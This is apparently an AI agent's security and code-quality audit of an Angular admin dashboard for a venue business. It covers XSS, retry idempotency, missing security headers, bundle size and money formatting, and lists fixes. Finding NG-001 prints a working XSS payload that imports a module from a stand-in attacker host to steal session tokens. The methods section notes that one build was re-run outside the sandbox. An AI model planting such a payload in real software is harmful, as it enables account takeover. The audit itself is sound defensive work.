# 03 — Angular admin web audit (NG-xxx)

## Scope and method

**Scope:** `apps/admin/src` (Angular 22, zoneless, signals, Tailwind 4, supabase-js, Leaflet). About 38.2k lines of production TS, plus 3.8k lines of `*.sample.ts` fakes and 42 specs. Covered: security sinks, CSV export, auth redirects and token handling, config and keys, build config, write paths, store and async patterns, money and time helpers, bundle composition, and TS quality.

**Method:** static reading and grep, plus two small read-only Python scripts. One script walks the static import graph from `main.ts` to find eager files and import cycles. The other decodes the `role` claim of the production key; the key itself was not printed. No files were modified apart from this report.

**Commands run (results):**
- `npm run build` (apps/admin):
  - First run inside the sandbox: aborted with exit 134 (SIGABRT) and no compiler output. This was the sandbox, not a compile error.
  - Re-run once outside the sandbox: **success** in 6.3 s.
  - **Initial total 790.04 kB raw / 196.78 kB transfer.** Budget warning: *"bundle initial exceeded maximum budget. Budget 500.00 kB was not met by 290.05 kB"*.
  - Initial chunks: `main` 347.59 kB, then chunks of 172.82, 80.28, 72.78 and 32.85 kB, and styles 58.65 kB.
  - Lazy chunks: `index` (supabase-js) 222.02 kB, `leaflet-src` 149.42 kB, `settings-page` 101.86 kB, `pricing-page` 56.87 kB, …
  - Output goes to `apps/admin/dist` (git-ignored). `git status` shows only `audit/` untracked.
- Greps: `innerHTML`/`bypassSecurityTrust`/`DomSanitizer`/`bindPopup`/`bindTooltip`, `randomUUID`, `pushOps(`, `client.rpc(`, `.from(`, `.insert/.update/.delete`, local-time `Date` APIs, `type="date|time"`, `any`, `data as`, `busy.set(true)` vs `if (this.busy())`.
- Static import-graph script: 66 eager app files; 58 of them reached via `core/sync/realtime-sync.ts`; **0 file-level import cycles**.
- JWT role decode of `environment.production.ts` key: `role=anon` (exp 2036).

## Architecture overview (short)

- **Shell** (`core/layout/shell.ts`) is eager. It injects `ArenaContext`, `Session`, `VenueStore` and **`RealtimeSync`**. `RealtimeSync` statically injects 15 feature stores and `FloorStore`/`VenueStore`.
- Feature screens are lazy routes (`app.routes.ts` `BUILT` map).
- **Store pattern**, consistent across 16 stores:
  - Each is an `@Service()` root singleton holding signals: data, `loading`, `loadError`.
  - Each has a `latest` counter that drops stale responses, keys its loads by `arenaId`, and registers `LoginScope.onEnd` to clear on login change.
  - Each has `stale()` and `refresh()` for live updates.
- **API pattern:** `@Service({ factory: () => new SupabaseXApi() }) abstract class XApi`. Tests swap in `*.sample.ts` fakes.
- **Reads:** RLS `select` plus read RPCs.
- **Writes:** `pushOps` → `sync_push`. The only other writing RPCs are `create_my_arena`, `invite_member`, `revoke_invite` and `accept_invite`, and those are documented.
- Drafts in detail panes are `linkedSignal(() => saved())`, so they reset when the store's data changes (arena switch, reload).

---

## Findings

## [P1][NG-001] Stored XSS: staff names reach Leaflet tooltips, which render strings as HTML
**Status:** VERIFIED (client sink and data flow). The end-to-end exploit was not executed.
**Category:** Security / XSS / privilege escalation
**Location:** `apps/admin/src/app/shared/map/geo-map.ts:192-200`, `apps/admin/src/app/features/attendance/components/punch-map.ts:14-22`
**Problem:** `GeoMap.draw()` calls `.bindTooltip(m.label)` with a plain string. For the attendance punch map, `label` is built as `` `${r.staffName} · … ` ``, and `staffName` is a database value. Leaflet renders string content with `innerHTML`, and Angular's sanitizer never sees it.
**Evidence:**
- `punch-map.ts:20`: `` label: `${r.staffName} · ${p.kind === 'in' ? 'in' : 'out'} ${formatDate(p.serverAt)} … ` ``
- `geo-map.ts:199`: `.bindTooltip(m.label)`
- `node_modules/leaflet/src/layer/DivOverlay.js:279-280` (Leaflet 1.9.4): `if (typeof content === 'string') { node.innerHTML = content; }`
- Name provenance:
  - `supabase/schemas/public/functions/op_staff_update.sql` sets `name = coalesce(nullif(btrim(p->>'name'), ''), name)` with no length or character validation, behind `_need(p_arena, 'settings')`.
  - `private/functions/invite_member.sql` only checks 1–80 chars.
- No CSP exists (NG-003). The Supabase session sits in `localStorage` (supabase-js default, `core/supabase/supabase.ts` `persistSession: true`).
**Impact:**
- Any member holding `settings` can plant a name. That member may be floor staff who cannot use the dashboard, sending `sync_push` directly with their own JWT.
- Example payload: `<img src=x onerror=import('//evil.example/x')>`, 44 characters, so it fits even the 80-character invite limit.
- The script runs in an owner's dashboard session when the owner hovers that person's pin on *Attendance → Records* (the punch map). It can read the owner's access and refresh tokens from `localStorage` and act as the owner: money, voids, payroll, permission grants.
- This lets a `settings` holder escalate to owner level.
**Failure Scenario:**
1. A staff member with Settings renames themselves or a colleague to the payload via `staff.update`.
2. The owner opens Attendance → Records and hovers a pin.
3. The attacker's module runs and exfiltrates the session.
**Recommended Fix:**
- Pass Leaflet a DOM node or a function returning a node, e.g. `const el = document.createElement('span'); el.textContent = m.label; bindTooltip(el)`. Alternatively escape the label.
- Add a lint or grep rule banning string content in `bindTooltip`/`bindPopup`/`setContent`/`divIcon({html})`.
- Optionally restrict staff names server-side: length cap in `op_staff_update`, no `<>`.
**Estimated Effort:** Small
**Production Blocker:** Yes
**Suggested Verification:** Unit test that a `GeoMarker` label `<b>x</b>` renders as literal text, using the real Leaflet rather than `testing/fake-leaflet.ts`. Manual check: rename a test staff member to `<i>x</i>`, hover their pin, and confirm the text is not italic.

## [P2][NG-002] Write ids are fresh on every attempt, so a retry after an ambiguous network failure duplicates money, payroll and leave records
**Status:** VERIFIED (client). The server does de-duplicate a reused `payment_id` or `op_id`, but the client never reuses them.
**Category:** Async safety / idempotency / money integrity
**Location:**
- `apps/admin/src/app/core/sync/push-ops.ts:77-81`
- `apps/admin/src/app/features/sales/data/sales-api.ts:303-344`
- `apps/admin/src/app/features/payroll/data/payroll-store.ts:159-183`
- `apps/admin/src/app/features/pay-setup/data/pay-setup-store.ts:93-107`
- `apps/admin/src/app/features/leave/data/leave.models.ts:171-178`
- `apps/admin/src/app/features/sales/dialogs/money-dialog.ts:231-281`
**Problem:**
- `pushOps` mints `op_id: crypto.randomUUID()` per call. It reuses ids only inside its own `retry` loop.
- Entity ids are also minted per call, inside the API or store method: `payment_id`, `refund_id`, `new_payment_id`, salary `adjustment id`, `pay_rate id`, `pay_policy id`, and the reverse id.
- `leave.adjust` and `attendance.correct` (action `add`) carry no client id at all.
- A transport failure after the server committed shows `dbError` 'network': "Could not reach the server. Check the connection and try again". The dialog stays open and Save sends a brand-new op with new ids.
**Evidence:**
- `push-ops.ts:78`: `op_id: crypto.randomUUID(),`
- `sales-api.ts:309`: `payment_id: crypto.randomUUID(),` (refund at 322; correction at 340-341)
- `payroll-store.ts:169`: `adjustmentPayload(crypto.randomUUID(), …)`
- `db-error.ts:15-19`: the network message invites a retry.
- Server: `op_payment.sql` header lists `duplicate (payment_id reused)` and `op_salary_adjustment_add.sql` lists `duplicate (id reused)`. Re-using the id would have been safe.
**Impact:** Duplicate append-only records:
- A second partial payment (capped only by `overpayment`, so a ₹500 part-payment on a ₹1000 bill can be recorded twice).
- A second refund (capped by what was collected).
- A duplicated bonus or advance in a draft salary run.
- A doubled leave-balance adjustment.
- A duplicate manual attendance entry.

Each then needs a manual reversal, and an unnoticed one goes into a finalised salary run. `new-run-dialog.ts:123` and `mark-dialog.ts:294` have the same per-click pattern; there the server's overlap and duplicate checks probably refuse instead.
**Failure Scenario:**
1. The owner records a ₹500 UPI payment on a flaky connection.
2. The RPC commits but the response is lost (TypeError).
3. The dialog says "try again" and the owner clicks Save.
4. A second ₹500 payment is recorded.
**Recommended Fix:**
- Generate entity ids and op ids once per user action: when the dialog or form opens, or on first submit, held in a field. Reuse them on every retry of that action.
- Let `pushOps` accept caller-supplied `op_id`s. A retry then replays the server's stored answer (CLAUDE.md: "Op id = row id so resends replay").
- Treat a `duplicate` refusal on a retried action as success.
- Give `leave.adjust` and `attendance.correct add` client ids server-side. This needs a contract change; coordinate with the SQL auditor.
**Estimated Effort:** Medium
**Production Blocker:** No. Strongly recommended before money goes live.
**Suggested Verification:** Unit test: make `rpc` throw a TypeError after recording the call, click Save twice, and assert both calls carry identical `payment_id` and `op_id`. Then `tool/sync_it.sh` for replay semantics.

## [P2][NG-003] No CSP, frame-ancestors or other security headers, and no hosting config in the repo
**Status:** VERIFIED (absent from the repo). The actual host configuration NEEDS VERIFICATION.
**Category:** Security / deployment hardening
**Location:** `apps/admin/src/index.html:1-23`, `apps/admin/angular.json:13-63`. No `_headers`, `vercel.json`, `netlify.toml`, `firebase.json` or nginx config is tracked (`git ls-files` grep empty).
**Problem:**
- `index.html` has no CSP meta tag, and the repo defines no response headers for the dashboard's host.
- Without `frame-ancestors`/`X-Frame-Options`, the dashboard can be framed (clickjacking on void, refund and payroll-finalise buttons).
- Without CSP, any script injection (NG-001) can load remote code and read the `localStorage` session.
- `docs/DEPLOY_SUPABASE.md` covers Supabase but not how or where the admin SPA is hosted (SPA fallback, headers, caching).
**Evidence:** `index.html` loads only Google Fonts and has no `<meta http-equiv="Content-Security-Policy">`; the repo has no hosting files.
**Impact:** Defence-in-depth is missing on an app that holds an owner's long-lived refresh token in `localStorage`.
**Failure Scenario:** NG-001's payload uses `import('//evil…')`. A CSP with `script-src 'self'` would have blocked it. Separately, a hostile page frames the dashboard and overlays a decoy on "Void bill".
**Recommended Fix:** Commit a hosting config with:
- `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://*.tile.openstreetmap.org; connect-src 'self' https://<ref>.supabase.co wss://<ref>.supabase.co; frame-ancestors 'none'; base-uri 'self'; object-src 'none'`
- `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, HSTS, and the SPA fallback to `index.html`.

Angular's `autoCsp` build option is an alternative for inline bootstrap scripts.
**Estimated Effort:** Small
**Production Blocker:** No. Recommended together with the NG-001 fix.
**Suggested Verification:** After deploy, run `curl -I https://<dashboard>/` and check the headers. Load the app and confirm the console shows no CSP violations (fonts, tiles and Realtime wss all work).

## [P3][NG-004] Initial bundle 790 kB vs the 500 kB budget: RealtimeSync makes almost every feature's data layer eager
**Status:** VERIFIED (static import graph). Exact byte attribution per chunk is LIKELY (`dist/` not inspected).
**Category:** Performance / architecture coupling
**Location:** `apps/admin/src/app/core/sync/realtime-sync.ts:1-24,173-195`, `apps/admin/src/app/core/layout/shell.ts:7,32`, `apps/admin/src/app/app.routes.ts:62-66` (eager `Shell`)
**Problem:**
- `Shell` is eager and injects `RealtimeSync`.
- `RealtimeSync` statically imports and injects 15 feature stores: Sales, Overview, Pricing, FloorOptions, Accessories, Users, Attendance, AttendanceRules, WorkHours, Shifts, Calendar, Leave, LeaveRules, PaySetup and Payroll. Through those it pulls in their APIs and models.
- The import-graph walk finds 66 eager app files, 58 of them reached only through `realtime-sync.ts`. That is about 436 kB of TS source, including `pricing-api.ts` (17 kB), `sale.models.ts` (16 kB), `pricing.models.ts`, `attendance.models.ts`, `work-hours.ts`, `payroll.models.ts`, `leave.models.ts`, `shifts.models.ts`, `pay-policy.ts` and `pay-setup.models.ts`.
- supabase-js and Leaflet are correctly lazy.
**Evidence:**
- Build: `Initial total 790.04 kB`, warning exceeded by 290.05 kB.
- `realtime-sync.ts:7-21` imports `features/*/data/*` stores.
- Module-level coupling: `core/sync` ↔ 11 feature folders (bidirectional, since features import `core/sync/push-ops`).
**Impact:**
- About 197 kB transferred on first load for every visitor, including sign-in, register and accept-invite (shared chunks).
- The core depends on features (inverted layering), so every new feature store has to be wired into core.
**Failure Scenario:** Slow first paint for invitees and owners on mobile data. The budget stays red, which hides future regressions.
**Recommended Fix:** Invert the dependency:
- `RealtimeSync` publishes the refresh targets, e.g. a root `signal<Set<RefreshTarget>>` or a small `RefreshBus`.
- Each store subscribes when it is first constructed by its lazy route, or registers itself in a `REFRESHABLE` multi-provider declared in the route's `providers`.
- Alternatively, lazy-load the stores in `flush()` with `import()` plus `Injector.get`.

Then re-check the budget.
**Estimated Effort:** Medium
**Production Blocker:** No
**Suggested Verification:** `npm run build`. The initial total should fall well under 500 kB, and `realtime-sync.spec.ts` should be adapted.

## [P3][NG-005] Double-submit protection depends on the re-rendered `[disabled]` button only
**Status:** LIKELY (zoneless CD timing). NEEDS VERIFICATION in a browser.
**Category:** Async safety
**Location:** `apps/admin/src/app/features/sales/dialogs/money-dialog.ts:231-251`, `apps/admin/src/app/features/sales/dialogs/void-dialog.ts:107-117`, `apps/admin/src/app/features/payroll/dialogs/new-run-dialog.ts:118-123`. The same applies to 66 of 68 `busy.set(true)` sites; only `games/components/game-detail.ts:214` and `games/dialogs/game-dialog.ts:225` check `if (this.busy()) return`.
**Problem:**
- Submit handlers set `busy` but never check it on entry.
- With zoneless change detection, the button is disabled only after the next scheduled render.
- Form submit by Enter (key auto-repeat) or two very fast activations can enter `save()` twice. Each call mints new ids (NG-002), so both apply.
**Evidence:** `money-dialog.ts:231` `protected async save(event)` has no busy check before `this.busy.set(true)` at line 251.
**Impact:** A rare duplicate payment, refund or adjustment. It compounds NG-002.
**Failure Scenario:** The owner holds Enter in the amount field of the payment dialog.
**Recommended Fix:** Add `if (this.busy()) return;` as the first statement of every submit handler that pushes ops. Ideally do it in a small shared helper together with the NG-002 per-action ids.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Component test calling `save()` twice synchronously and asserting a single `pushOps` call.

## [P3][NG-006] Money dialog and bill detail round paise to whole rupees in limits, hints and errors
**Status:** VERIFIED
**Category:** Money handling / UX correctness
**Location:** `apps/admin/src/app/shared/money/rupees.pipe.ts:4-6`, `apps/admin/src/app/features/sales/dialogs/money-dialog.ts:176-179,209-222,239`, `apps/admin/src/app/features/sales/components/bill-detail.ts:345,365,379`
**Problem:**
- `formatRupees` does `Math.round(paise / 100)`.
- The payment dialog shows "Still due: ₹121" and "At most ₹121" for a 12050-paise due. If the owner types the displayed 121, the dialog's own check (`paise > limit`) says "That is more than ₹121".
- Bill-detail history and payment amounts are also rounded. Bills can carry paise from percent discounts and rules.
- Negative values render as `₹-300`, inconsistent with `formatPaise`'s `−₹300.00`.
**Evidence:** `rupees.pipe.ts:5` `return '₹' + Math.round(paise / 100).toLocaleString('en-IN');`, used at `money-dialog.ts:211,239`.
**Impact:** Confusing, contradictory money copy. Totals shown on screen may not add up to the paise-exact CSV. Stored data is not affected.
**Failure Scenario:** A ₹120.50 due shows as ₹121, and entering 121 is refused with "more than ₹121".
**Recommended Fix:** Use `formatPaise` (exact) for any amount the user must act on: due, limits, refundable, per-payment amounts in dialogs and bill detail. Keep whole-rupee rounding for KPI tiles only.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Manual: a bill with a 10% discount producing paise, then open "Record payment".

## [P3][NG-007] Raw server and database messages are shown to users; the generic `forbidden` copy is wrong for most ops
**Status:** VERIFIED
**Category:** Error handling / information disclosure
**Location:** `apps/admin/src/app/core/supabase/db-error.ts:12-21`, `apps/admin/src/app/core/auth/auth-api.ts:65-78`, `apps/admin/src/app/core/sync/push-ops.ts:96-102,144-151`
**Problem:**
- `dbError` returns `new AppError(code, DB_MESSAGES[code] ?? code)`, where `code = e.message`. Any unmapped PostgREST or Postgres error text reaches the UI verbatim, e.g. constraint names or "function … does not exist". `toAppError` does the same for unknown errors.
- `pushOps` shows the bare refusal code when no message map has it (e.g. `period_finalised` on a screen that does not map it).
- `OP_MESSAGES.forbidden` says "You need the Settings permission for that" for every op kind, including payroll and money ops, unless a feature overrides it.
**Evidence:** `db-error.ts:20`; `push-ops.ts:101` `messages[code] ?? OP_MESSAGES[code] ?? code`; `push-ops.ts:145`. This is consistent with the CLAUDE.md known limitation that the server hint is not surfaced.
**Impact:** Low. Internal schema details are shown to authenticated owners, and some refusal copy is misleading.
**Failure Scenario:** A schema mismatch after a partial deploy shows "Could not find the function public.arena_sales(p_arena, p_from, p_to) in the schema cache" to the owner.
**Recommended Fix:**
- Map unknown codes to a generic "Something went wrong (code X). Try again or contact support", and log the raw message to the console.
- Surface the PostgREST `hint` for `sync_push` refusals.
- Make the `forbidden` fallback permission-neutral.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Unit tests for `dbError` with an unmapped message.

## [P3][NG-008] The password-reset link replaces whatever login is stored in this browser (session swap)
**Status:** NEEDS VERIFICATION (UX of the reset page; server-side Auth behaviour)
**Category:** Security / auth flow
**Location:** `apps/admin/src/app/features/auth/reset-password.ts:174-214`
**Problem:**
- The reset page signs the link's tokens into the **main, persisted** client (`api.signInFromLink` then `session.refresh()`).
- An attacker can request a recovery e-mail for *their own* account and get the owner to open that link. The owner's dashboard is then silently switched to the attacker's login (login-CSRF).
- The invitation page deliberately avoids this with an isolated in-memory client (`supabase.ts` `isolatedClient`, `accept-invite.ts`). The reset page does not.
**Evidence:** `reset-password.ts:202-203`.
**Impact:** Low. The owner ends up in the attacker's account and may enter data there, or get confused. No access to the owner's arena is gained.
**Failure Scenario:** A phishing mail containing a genuine Supabase recovery link for `attacker@…`.
**Recommended Fix:**
- Show the account e-mail prominently on the reset page.
- If someone else is signed in, ask before replacing them, or reuse the isolated-client pattern and only persist after the password is set.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Manual: signed in as owner A, open a recovery link for B, and observe the result.

## [P3][NG-009] Unpaged table reads depend on PostgREST `max_rows = 1000`, and leave history loads all-time
**Status:** VERIFIED (code). The real-world volume is low.
**Category:** Performance / data completeness
**Location:**
- `apps/admin/src/app/features/pay-setup/data/pay-setup-api.ts:78-100`
- `apps/admin/src/app/features/shifts/data/shifts-api.ts:69-90`
- `apps/admin/src/app/features/payroll/data/payroll-api.ts:202-245`
- `apps/admin/src/app/features/pricing/data/pricing-api.ts:274-300`
- `apps/admin/src/app/features/leave/data/leave-api.ts:142-163` with `features/leave/leave-page.ts:182`
**Problem:**
- Several `.from(...).select()` reads have no `.range()`. PostgREST silently caps them at `max_rows = 1000` (`supabase/config.toml:18`).
- `staff_pay_rates` is ordered ascending by `effective_from`, so truncation drops the **newest** rates first.
- Leave requests and adjustments are paged in 1000s but the whole history is loaded and rendered with no paging.
- The floor, attendance and sales paths do page or are bounded (93-day cap); see "Controls verified".
**Evidence:** `pay-setup-api.ts:85` `.from('staff_pay_rates').select('*').eq('arena_id', arenaId).order('effective_from')` with no range.
**Impact:** Unlikely for a single venue in the near term. If reached, pay figures shown on Team would silently use stale rates. Salary itself is computed server-side.
**Failure Scenario:** A multi-year, multi-venue tenant with more than 1000 rate rows.
**Recommended Fix:** Reuse the existing `rows()` pager (leave-api) for these reads, or filter to the relevant window. Add list paging to the leave history.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Seed more than 1000 rows locally and compare the counts.

## [P3][NG-010] Any arena member's broadcast can force dashboard-wide refreshes
**Status:** NEEDS VERIFICATION (realtime auth policy for broadcast send is SQL-side)
**Category:** Robustness / abuse
**Location:** `apps/admin/src/app/core/sync/realtime-sync.ts:294-339,395-493`
**Problem:**
- `onBroadcast` trusts any `sync` message on the private arena channel whose `arena_id` matches.
- An unknown or missing `kind` maps to `ALL_TARGETS`, which reloads every on-screen store and `ArenaContext.load(true)`.
- Any member (floor staff) or a buggy device can send these about every 800 ms and keep the owner's dashboard refetching continuously.
**Evidence:** `realtime-sync.ts:158` `?? ALL_TARGETS`; `realtime-sync.ts:337` `this.schedule(ALL_TARGETS)`.
**Impact:** Extra load and cost on the Supabase project, plus UI churn. Data stays correct because refreshes re-read through RLS.
**Failure Scenario:** A misbehaving floor-app build loops on broadcasting.
**Recommended Fix:**
- Ignore unknown kinds rather than refreshing everything; or map a legacy bare nudge to the floor targets only.
- Add a minimum interval between full refreshes.
- Confirm with the SQL auditor that `realtime.messages` insert policies limit who can broadcast.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Unit test: `onBroadcast` with `kinds: ['bogus.x']` schedules nothing.

## [P3][NG-011] `environment.production.ts` is committed filled in, contradicting its own header and the deploy doc
**Status:** VERIFIED
**Category:** Configuration / release hygiene
**Location:** `apps/admin/src/environments/environment.production.ts:1-19`, `apps/admin/angular.json:60` (`defaultConfiguration: production`), `docs/DEPLOY_SUPABASE.md:22`
**Problem:**
- The header says "Left empty on purpose … until both values are filled in" and the deploy doc says "filled at deploy time". The file actually contains the hosted project URL and its legacy anon JWT.
- `npm run build`'s default configuration is production, so any build on any machine targets the hosted project.
**Evidence:** The key decodes to `role=anon` (safe to ship by design; not a secret leak). `supabaseUrl` is a hosted `*.supabase.co` URL.
**Impact:** Process risk only. It goes against the "never point a dev run at hosted" rule for anyone who serves a production build locally. The doc is wrong.
**Failure Scenario:** A developer runs `ng serve --configuration production` to debug and writes to the live project.
**Recommended Fix:** Either keep the values and fix the comment and doc, or blank them again and inject them at deploy time. Prefer the publishable `sb_publishable_…` key over the legacy JWT.
**Estimated Effort:** Small
**Production Blocker:** No
**Suggested Verification:** Review the doc and file together.

---

## Controls verified as sound

- **No Angular sanitizer bypasses.** Zero `innerHTML`, `[innerHTML]`, `bypassSecurityTrust*`, `DomSanitizer`, `insertAdjacentHTML`, `document.write`, `window.open` or `location.href` assignments in production code (grep over `src/app`). The only HTML sink is the Leaflet tooltip (NG-001).
  - Leaflet `title`/`alt` are fixed strings; `ATTRIBUTION` is a constant.
- **CSV formula injection neutralised.** `textCell` (`features/sales/components/sales-csv.ts:34-38`) prefixes `= + - @ \t \r` with `'` and quotes `, " \n \r`.
  - All three exporters use it for every free-text cell: `sales-csv.ts`, `payroll-csv.ts`, `attendance-csv.ts`.
  - Non-`textCell` cells are numbers, ISO dates, server ids, or labels from fixed enums.
  - Exports include a UTF-8 BOM.
- **Open redirect.** `safeNext` (`core/auth/session.ts:87-90`) accepts only single-slash in-app paths, rejects `//` and `\`, and excludes the auth pages. It is used with `router.navigateByUrl`, which cannot leave the origin.
- **Link tokens.** `accept-invite.ts:322-336` and `reset-password.ts:174-184` read the tokens and then `replaceState` them out of the address bar and history. `detectSessionInUrl: false` (`supabase.ts`).
  - The invitee signs in on an isolated, in-memory, non-refreshing client, so the owner's stored session is untouched (`supabase.ts` `isolatedClient`, `users-api.ts:142-146` for sending invitations too).
- **Key and config guard.**
  - `configProblem` (`core/supabase/supabase.ts`) refuses `sb_secret_…` and `service_role` JWTs, non-https URLs, and local hosts in production builds, and routes to a setup screen instead of the app.
  - The shipped production key is `role=anon`.
- **No production source maps.** The `production` configuration sets no `sourceMap` (Angular default off). Only `development` sets `sourceMap: true` (`angular.json`). `outputHashing: all`.
- **Single write path.** Every table write goes through `pushOps` → `sync_push` (37 call sites).
  - The only other writing RPCs are the documented `create_my_arena`, `invite_member`, `revoke_invite` and `accept_invite`.
  - There are no `.insert/.update/.upsert/.delete` on tables.
  - `canEdit`, `hasPerm` and `permGuard` are documented and used as visibility only (`core/arena/arena-context.ts:69-85`).
  - Money limits in the dialog mirror server checks: `op_payment.sql` raises `overpayment` and `refund_exceeds_paid`; `op_session_void.sql` requires a reason.
- **pushOps retry semantics.** Inside one call, `retry` answers are resent with the **same** op ids (`push-ops.ts:77-93`).
  - A partial batch rethrows with `applied` and the store reloads (`writeThenReload`), so drafts are never shown as saved.
  - Nudges go out only after the server answered.
- **Login change clears memory.** `Session.setUser` runs `LoginScope.end()` synchronously on sign-out or another login (`session.ts:75-79`). All 16 feature stores, `ArenaContext`, `VenueStore` and `FloorStore` register `onEnd`.
  - Every store guards responses with a `latest`/`generation` counter, so a read in flight for the previous login or arena never lands.
  - `Shell` navigates away when the session ends in another tab.
- **Arena switch.** Stores key loads by `arenaId` and clear their data when the key changes. Detail drafts are `linkedSignal` bound to store data, so they reset; there is no cross-arena write of a stale draft. `RealtimeSync` tears down and re-joins per arena and per user, with a generation guard.
- **Realtime.**
  - Private channel; JWT set before joining.
  - `postgres_changes` filtered by `arena_id`.
  - DELETE events deliberately not subscribed (no cross-arena id leak), `realtime-sync.ts:165-167`.
  - Bursts debounced; off-screen stores only marked stale.
- **Money in TS.**
  - `parseRupees` (`sale.models.ts:426-431`) is integer-exact and string-based.
  - Pay payloads are integer paise (`pay-setup.models.ts:250-261`, `payroll/dialogs/adjustment-dialog.ts:112`).
  - `formatPaise` and payroll `moneyCell` are integer-only.
  - Pricing float parsers (`discount-detail.ts:91-96`, `rule-detail.ts:401-403`) reject anything that is not exactly two decimals (epsilon check) before `Math.round`.
  - Whole-rupee rate inputs require `Number.isInteger`.
- **Time.**
  - `shared/time/ist.ts` uses a fixed +05:30 offset and `Intl.DateTimeFormat({ timeZone: 'Asia/Kolkata' })`.
  - Pickers are native `type=date|time` and yield zone-free strings; `istInstant` (`attendance.models.ts:319-327`) converts IST to UTC explicitly.
  - Discount bounds use explicit `+05:30`.
  - No `getHours/getDate/getMonth/setHours/toLocaleDateString` or local `new Date(y, m, d)` in production code.
  - "Now" comes from the `Clock` service.
  - Report periods are validated and capped at 93 days (`sale.models.ts:203-209`), including periods taken from the URL (`periodFor`), so the attendance PostgREST `or(...)` filter only ever receives validated dates.
- **Bounded lists.**
  - Sales list shows 40 and attendance 60 at a time, with "show more"; members 50 per page.
  - `arena_sales` returns `jsonb`, so it is not truncated by `max_rows`.
  - Floor and attendance reads page in 1000s.
- **Lazy loading.** All feature screens are lazy routes. supabase-js (222 kB) and Leaflet (149 kB) are lazy chunks.
- **TS quality.** 0 `any` in production code. 0 file-level import cycles (scripted DFS). RPC results cast to `Row` are always mapped through `String()`/`Number()`/`=== true` coercion before use.
- **Timers and listeners.** `injectNow` clears its interval on destroy; `GeoMap` removes the map and its `ResizeObserver`; `RealtimeSync.destroy` removes its `online` listener.

## Not reviewed

- Template-level accessibility (AXE/WCAG) and every individual dialog's markup and validation copy.
- Specs and `testing/` helpers; 42 spec files were neither run nor read.
- `dist/` contents (per CLAUDE.md), so per-chunk byte attribution in NG-004 is inferred from the source graph.
- Runtime behaviour: no dev server, no browser, nothing clicked. Zoneless double-submit timing (NG-005) is untested.
- Server-side enforcement (SQL auditor): realtime broadcast authorization (NG-010), `leave.adjust`/`attendance.correct` idempotency contract (NG-002), RLS on pay tables.
- `npm audit` and dependency CVEs (not run, as instructed). Leaflet 1.9.4 and supabase-js ^2.117 versions were not checked against advisories.
- Hosting/CDN configuration outside the repo (NG-003).
- `features/setup/setup-page.ts` (676 lines) and `features/pricing/components/*-detail.ts` were only partly read beyond their money parsing.

## Code-quality notes for 07

- **Largest production files** (lines):
  - Over 600: `features/setup/setup-page.ts` 676, `features/attendance/attendance-home-page.ts` 638.
  - 500–600: `features/pricing/components/discount-detail.ts` 596, `features/pricing/components/rule-detail.ts` 557, `core/floor/floor-api.ts` 547, `features/attendance/attendance-page.ts` 514, `features/auth/accept-invite.ts` 514, `core/sync/realtime-sync.ts` 501.
  - Just under 500: `features/payroll/components/run-detail.ts` 495, `features/sales/sales-page.ts` 483, `features/pricing/data/pricing-api.ts` 482.
  - Several components combine template, form logic, validation and export code.
- **CSV download code duplicated 4×** (Blob, BOM, anchor, revoke, slug): `features/attendance/attendance-page.ts:500-512`, `features/attendance/attendance-home-page.ts:620-632`, `features/sales/sales-page.ts:470-480`, `features/payroll/components/run-detail.ts:478-490`. Extract a `shared/csv/download.ts`.
- **`textCell` lives in `features/sales/components/sales-csv.ts`** but is imported by the payroll and attendance exporters. Move it to `shared/csv`.
- **Two CSV money formatters:** `sales-csv.ts:41` `(paise/100).toFixed(2)` (float, correct for integer paise) vs `payroll-csv.ts:27` integer `moneyCell`. Use one.
- **Rupee input parsing implemented 4+ ways:**
  - `sale.models.ts:426` `parseRupees` (string-exact; also used by pay-setup and payroll).
  - `discount-detail.ts:91` `paise()` (float plus epsilon).
  - `rule-detail.ts:401` (float plus epsilon).
  - `type-detail.ts:326` and `setup-page.ts:586` (whole rupees).
  - Consolidate into `shared/money`.
- **IST constants duplicated:** `IST_OFFSET_MS` in `shared/time/ist.ts:5`, `features/attendance/data/attendance.models.ts:316` and `features/overview/data/overview.models.ts:19`; `DAY_MS` twice. `istInstant`/`istParts` belong in `shared/time/ist.ts`.
- **Dead code:**
  - `features/users/users-page.ts` is not routed (`/users` redirects to `staff/team`); only its spec references it.
  - The `ScreenPlaceholder` branch in `app.routes.ts:94-108` is unreachable while every `NAV_ITEMS` path is in `BUILT`.
- **Layering:** `core/sync/realtime-sync.ts` depends on 11 feature folders (NG-004). There are mutual feature dependencies: `pricing↔sales`, `overview↔sales`, `attendance↔calendar`, `settings↔shifts` (e.g. `sales-api.ts:6` imports `overview/data/overview.models`).
- **`dbError` re-exported** from `core/arena/arena-api.ts:52-55` and imported via both paths (e.g. `sales-api.ts:2` uses the arena-api path).
- **22 per-feature `*_MESSAGES` maps** for refusal codes, with overlapping entries (`forbidden`, `invalid_payload`, `not_found`). Consider one central code → copy table with per-feature overrides.
- **Test-awareness in production code:** `realtime-sync.ts:257-264` sniffs `process.env.VITEST`. Prefer an injectable toggle provided by tests.
- **`*.sample.ts` fakes** (3,758 lines) sit beside production code under `features/*/data`. They are test-only (only `testing/page-test.ts` imports them), so they are not in the bundle, but they inflate the feature folders.
- **Inconsistent submit guard:** 2 of 68 `busy` handlers check `busy()` on entry (NG-005).
- **Stacked doc comments:** `features/sales/data/sales-store.ts:93-101` has two JSDoc blocks; the first describes `refresh()` but is attached to `stale()`.
- **Inconsistent amount display:** `formatRupees` (whole-rupee) is used 34× vs exact `formatPaise` 16× (NG-006). Document which one is for which purpose.
- **Edge cases:**
  - `discount-detail.ts:530` sets `validUntil` to `23:59:59+05:30`, so a coupon expires one second early. Prefer an exclusive next-day midnight.
  - `announcePush` (`push-ops.ts:131`) calls `client.channel(topic)` when not joined, which registers a channel object on the client that is never removed. This is minor and NEEDS VERIFICATION against the realtime-js version.
